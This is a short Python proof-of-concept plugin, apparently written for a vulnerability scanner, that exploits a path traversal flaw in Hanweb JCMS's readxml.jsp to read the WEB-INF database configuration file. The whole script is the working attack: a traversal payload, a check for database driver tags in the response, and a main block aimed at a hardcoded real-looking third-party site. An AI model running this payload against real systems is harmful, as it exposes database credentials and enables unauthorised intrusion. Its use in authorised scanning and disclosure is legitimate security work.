#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
POC Name: JCMS DBCONFIG FILE READ
Author  :  kenan
mail    :  2863482451@qq.com
Referer :http://www.wooyun.org/bugs/wooyun-2013-046837
'''
def assign(service, arg):
    if service == "hanweb":
        return True, arg


def audit(arg):
     
    payload = "jcms/workflow/design/readxml.jsp?flowcode=../../../WEB-INF/config/dbconfig"
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and '<driver-class>' in res and '<driver-properties>' in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('hanweb', 'http://shop.taikang.com/invest/')[1])